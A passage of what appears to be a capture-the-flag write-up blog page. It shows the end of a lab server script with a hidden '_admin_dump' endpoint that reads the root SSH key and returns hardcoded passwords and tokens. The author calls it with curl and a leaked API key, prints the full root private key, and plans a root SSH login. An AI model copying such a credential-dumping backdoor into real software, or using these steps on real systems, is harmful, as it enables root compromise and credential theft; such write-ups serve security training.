+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;cpu&#34;</span>: <span style="color:#e6db74">&#34;23%&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;memory&#34;</span>: <span style="color:#e6db74">&#34;1.2GB/4GB&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;load&#34;</span>: <span style="color:#e6db74">&#34;0.45&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;nominal&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> tool_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ops.list_services&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;services&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;nginx&#34;</span>, <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>, <span style="color:#e6db74">&#34;pid&#34;</span>: 1234<span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;opsmcp&#34;</span>, <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>, <span style="color:#e6db74">&#34;pid&#34;</span>: 5678<span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;jupyter&#34;</span>, <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>, <span style="color:#e6db74">&#34;pid&#34;</span>: 9012<span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;mcpjam&#34;</span>, <span style="color:#e6db74">&#34;status&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>, <span style="color:#e6db74">&#34;pid&#34;</span>: 3456<span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> tool_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ops.check_disk&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;filesystems&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;mount&#34;</span>: <span style="color:#e6db74">&#34;/&#34;</span>, <span style="color:#e6db74">&#34;used&#34;</span>: <span style="color:#e6db74">&#34;4.2G&#34;</span>, <span style="color:#e6db74">&#34;available&#34;</span>: <span style="color:#e6db74">&#34;15G&#34;</span>, <span style="color:#e6db74">&#34;percent&#34;</span>: <span style="color:#e6db74">&#34;22%&#34;</span><span style="color:#f92672">}</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;mount&#34;</span>: <span style="color:#e6db74">&#34;/home&#34;</span>, <span style="color:#e6db74">&#34;used&#34;</span>: <span style="color:#e6db74">&#34;1.1G&#34;</span>, <span style="color:#e6db74">&#34;available&#34;</span>: <span style="color:#e6db74">&#34;8G&#34;</span>, <span style="color:#e6db74">&#34;percent&#34;</span>: <span style="color:#e6db74">&#34;12%&#34;</span><span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> tool_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ops.view_logs&#34;</span>:
+</span></span><span style="display:flex;"><span>        service <span style="color:#f92672">=</span> args.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;service&#39;</span>, <span style="color:#e6db74">&#39;system&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;service&#34;</span>: service,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;logs&#34;</span>: <span style="color:#f92672">[</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;[2026-01-22 10:00:01] Service started&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;[2026-01-22 10:00:02] Listening on configured port&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;[2026-01-22 10:15:33] Health check passed&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;[2026-01-22 11:00:00] Routine maintenance completed&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> tool_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ops._debug_mode&#34;</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;debug&#34;</span>: True,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Debug mode enabled&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;hidden_tools&#34;</span>: list<span style="color:#f92672">(</span>HIDDEN_TOOLS.keys<span style="color:#f92672">())</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Debug endpoints now accessible&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> tool_name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ops._admin_dump&#34;</span>:
+</span></span><span style="display:flex;"><span>        target <span style="color:#f92672">=</span> args.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;target&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        confirm <span style="color:#f92672">=</span> args.get<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;confirm&#39;</span>, False<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> not confirm:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Confirmation required&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;usage&#34;</span>: <span style="color:#e6db74">&#34;Set confirm=true to proceed&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;warning&#34;</span>: <span style="color:#e6db74">&#34;This dumps sensitive credentials&#34;</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> target <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;ssh_keys&#34;</span>:
+</span></span><span style="display:flex;"><span>            try:
+</span></span><span style="display:flex;"><span>                with open<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/root/.ssh/id_rsa&#39;</span>, <span style="color:#e6db74">&#39;r&#39;</span><span style="color:#f92672">)</span> as f:
+</span></span><span style="display:flex;"><span>                    key_data <span style="color:#f92672">=</span> f.read<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;target&#34;</span>: <span style="color:#e6db74">&#34;ssh_keys&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;root_private_key&#34;</span>: key_data,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;note&#34;</span>: <span style="color:#e6db74">&#34;Emergency recovery key dump&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>            except Exception as e:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;target&#34;</span>: <span style="color:#e6db74">&#34;ssh_keys&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;error&#34;</span>: f<span style="color:#e6db74">&#34;Could not read key: {str(e)}&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> target <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;passwords&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;target&#34;</span>: <span style="color:#e6db74">&#34;passwords&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;dump&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;root&#34;</span>: <span style="color:#e6db74">&#34;</span>$6$rounds<span style="color:#e6db74">=656000</span>$saltsalt$hashedpassword<span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;analyst&#34;</span>: <span style="color:#e6db74">&#34;JupyterN0tebook!2026&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;mcp-dev&#34;</span>: <span style="color:#e6db74">&#34;Mcp!Insp3ct0r2026&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> target <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;tokens&#34;</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;target&#34;</span>: <span style="color:#e6db74">&#34;tokens&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;api_tokens&#34;</span>: <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;admin_token&#34;</span>: <span style="color:#e6db74">&#34;opsmcp_admin_7f3b9c2d1e4f5a6b&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#34;service_token&#34;</span>: <span style="color:#e6db74">&#34;opsmcp_svc_8c9d0e1f2a3b4c5d&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Invalid target&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;valid_targets&#34;</span>: <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;ssh_keys&#34;</span>, <span style="color:#e6db74">&#34;passwords&#34;</span>, <span style="color:#e6db74">&#34;tokens&#34;</span><span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">})</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> jsonify<span style="color:#f92672">({</span><span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#e6db74">&#34;Tool execution failed&#34;</span><span style="color:#f92672">})</span>, <span style="color:#ae81ff">500</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+</span></span><span style="display:flex;"><span>    app.run<span style="color:#f92672">(</span>host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;127.0.0.1&#39;</span>, port<span style="color:#f92672">=</span>5000, debug<span style="color:#f92672">=</span>False<span style="color:#f92672">)</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>As you can see, the <strong>server.py</strong> script is pretty lengthy. However, it&rsquo;s also <strong>super revealing</strong>. The script is configured for an <strong>opsmcp</strong> service and runs on port <strong>5000</strong>, it also shows <strong>hidden endpoints</strong> that can be accessed: <strong>ops._debug_mode</strong> and <strong>ops._admin_dump</strong>. To be honest, the <strong>debug mode</strong> just got skipped over because the <strong>admin dump</strong> tool revealed what I really wanted- an <strong>SSH key</strong>.<br>
+ <br>
+Running a curl request to the address returns this output:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>analyst@devhub:/opt/opsmcp$ curl -cv http://localhost:5000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;auth&#34;</span>:<span style="color:#e6db74">&#34;Required - X-API-Key header&#34;</span>,<span style="color:#e6db74">&#34;endpoints&#34;</span>:<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/tools/list&#34;</span>,<span style="color:#e6db74">&#34;/tools/call&#34;</span>,<span style="color:#e6db74">&#34;/health&#34;</span><span style="color:#f92672">]</span>,<span style="color:#e6db74">&#34;server&#34;</span>:<span style="color:#e6db74">&#34;OPSMCP&#34;</span>,<span style="color:#e6db74">&#34;status&#34;</span>:<span style="color:#e6db74">&#34;operational&#34;</span>,<span style="color:#e6db74">&#34;version&#34;</span>:<span style="color:#e6db74">&#34;2.1.0&#34;</span><span style="color:#f92672">}</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Since we have the <strong>X-API-Key</strong> <em>and</em> <strong>admin dump endpoint</strong> revealed in the script, privilege escalation to <strong>root</strong> would be a breeze:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>analyst@devhub:/opt/opsmcp$ curl -X POST http://localhost:5000/tools/call -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;name&#34;: &#34;ops._admin_dump&#34;, &#34;arguments&#34;: {&#34;target&#34;: &#34;ssh_
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">keys&#34;, &#34;confirm&#34;: true}}&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">{</span><span style="color:#e6db74">&#34;note&#34;</span>:<span style="color:#e6db74">&#34;Emergency recovery key dump&#34;</span>,<span style="color:#e6db74">&#34;root_private_key&#34;</span>:<span style="color:#e6db74">&#34;-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9\nG/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX\n8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z\n6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n\nGhm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ\n7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W\nv9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu\nITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs\ngyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s\nqKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa\nV3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS\n0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6\nJtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8\nHUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB\ndcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L\nCvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2\nnkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn\nMz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK\nMtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI\noocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk\nJt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ\nnI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr\nC8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK\nlFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=\n-----END OPENSSH PRIVATE KEY-----\n&#34;</span>,<span style="color:#e6db74">&#34;target&#34;</span>:<span style="color:#e6db74">&#34;ssh_keys&#34;</span><span style="color:#f92672">}</span></span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>A <strong>root SSH key</strong> right here in plaintext! There were some real bad formatting issues with the <strong>\n</strong> characters inserted there for newlines, so I just reran the <strong>curl</strong> command and piped in a <strong>python</strong> command to add the newlines correctly:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>analyst@devhub:/opt/opsmcp$ curl -X POST http://localhost:5000/tools/call -H <span style="color:#e6db74">&#34;Content-Type: application/json&#34;</span> -H <span style="color:#e6db74">&#34;X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a&#34;</span> -d <span style="color:#e6db74">&#39;{&#34;name&#34;: &#34;ops._admin_dump&#34;, &#34;arguments&#34;: {&#34;target&#34;: &#34;ssh_keys&#34;, &#34;confirm&#34;: true}}&#39;</span> | python3 -c <span style="color:#e6db74">&#34;import sys,json; print(json.load(sys.stdin)[&#39;root_private_key&#39;])&#34;</span>
+</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">2000</span>  <span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">1919</span>  <span style="color:#ae81ff">100</span>    <span style="color:#ae81ff">81</span>   521k  <span style="color:#ae81ff">22543</span> --:--:-- --:--:-- --:--:--  976k
+</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
+</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
+</span></span><span style="display:flex;"><span>G/jqltqP312IONAX9LwvTne81E4h+hi2xdjwgvh27iE4AvCQolR8S0GWHwHQjjXVQ5/dHX
+</span></span><span style="display:flex;"><span>8MA96Qabow623zQe5D6PUAsFj6aWP5fDceIziAxkLIMgpsE6I0bWOKaGmgEG0rW1I/mw8z
+</span></span><span style="display:flex;"><span>6HmooVORQsQoTaVUhnUmRJRcLpQEu94hzb+0kQ0ObKikcDTnit1kQ/7ZUOoyGhUgEwVk/n
+</span></span><span style="display:flex;"><span>Ghm2D96OW/JLpMIowwDxnka+3l9u5Aj55Y9fWN9aGld5pVvcoPRZ7twODIbXNSjzWsLQRQ
+</span></span><span style="display:flex;"><span>7l8/a2M+aQAAA8BGnYWeRp2FngAAAAdzc2gtcnNhAAABAQDBYfDgi/zIPDKo5pw7m4HY4W
+</span></span><span style="display:flex;"><span>v9FoPVMXX3am2Ale7S+PlJPKk5Qf0b+OqW2o/fXYg40Bf0vC9Od7zUTiH6GLbF2PCC+Hbu
+</span></span><span style="display:flex;"><span>ITgC8JCiVHxLQZYfAdCONdVDn90dfwwD3pBpujDrbfNB7kPo9QCwWPppY/l8Nx4jOIDGQs
+</span></span><span style="display:flex;"><span>gyCmwTojRtY4poaaAQbStbUj+bDzPoeaihU5FCxChNpVSGdSZElFwulAS73iHNv7SRDQ5s
+</span></span><span style="display:flex;"><span>qKRwNOeK3WRD/tlQ6jIaFSATBWT+caGbYP3o5b8kukwijDAPGeRr7eX27kCPnlj19Y31oa
+</span></span><span style="display:flex;"><span>V3mlW9yg9Fnu3A4Mhtc1KPNawtBFDuXz9rYz5pAAAAAwEAAQAAAQAjgZkZkXpjRXJDwrvS
+</span></span><span style="display:flex;"><span>0fWgXZtXR8gC3+b5+4eJgX3tLJuQz9t+UNhpR2XDNvQNnf3B+Ks9W0QQUznPfV0Nr3X3k6
+</span></span><span style="display:flex;"><span>JtWbN0e5LuLz9PHtYHd05Z+RpS0h2LIhIWNVp+Z2H6l54dy/1LELVVU47B0kSAD0Qig3g8
+</span></span><span style="display:flex;"><span>HUa/oEljrrgzTlYflRHhkHQblmd9ZaClUoxIDh0zf2Esmp3nIRBm4J1OX5UQPiPEa7/LkB
+</span></span><span style="display:flex;"><span>dcQr1K4Z1pbZglc5wPUJZCv8MtVPvW9rCgERl9Sl4bKevsgS4mMMUvVxNdqyasYqNAXi/L
+</span></span><span style="display:flex;"><span>Cvk9YYP9PS4q1dfCYMIvsJJNyoBtUiCJwqW2ba6hs1vVAAAAgDEPkj6UOdX1B872cHrja2
+</span></span><span style="display:flex;"><span>nkahzlja7GZw3G2+hsib4kH/G1nwQs9RRtnzqf/mrXeEhxB27ZN+QE39e7yTC3r6f84mSn
+</span></span><span style="display:flex;"><span>Mz/gS3Czh6DtP+S18jV4xCeac/SoLuxgLvPZ3xnHWvPO6HePQzyVlVk/MBfp+yPrCpIiHK
+</span></span><span style="display:flex;"><span>MtVMaeJXFYAAAAgQDSlTQAPhkFhsswOcohRO+1hd/4xdD9UECem1ytsb5/on47/GEWvtQI
+</span></span><span style="display:flex;"><span>oocmAAMvEYlOvs8GXeYkMBAwi5VCjLunNBCmuRMjTEgE7lqgdhfkK0Lx/a4BWnYaki+xbk
+</span></span><span style="display:flex;"><span>Jt9XB5f2NlmnT4A5QqiO+qPYA2i1iF9CSv5ypxqHFChgMZNwAAAIEA6xcR6lBjwgtKuzRQ
+</span></span><span style="display:flex;"><span>nI+f8DFRxcdfKY1gs0BmfS0RRxwDzIEwJHYafyHnq/CKBTDPCYyn/VI+mF64hhtjUbDgAr
+</span></span><span style="display:flex;"><span>C8X6q/4LJecp3piSHgv6yXhpzkxtz+Q/JSXPFf/9NAgVFQtUjrrnGZbP9kNySaX6q6/npK
+</span></span><span style="display:flex;"><span>lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI<span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Now that I got that, all I needed to do was copy the contents of the <strong>private key</strong>, throw it on my attacker, and <strong>SSH</strong> into the target as root!</p>
+<h2 id="privesc" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>PRIVESC</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
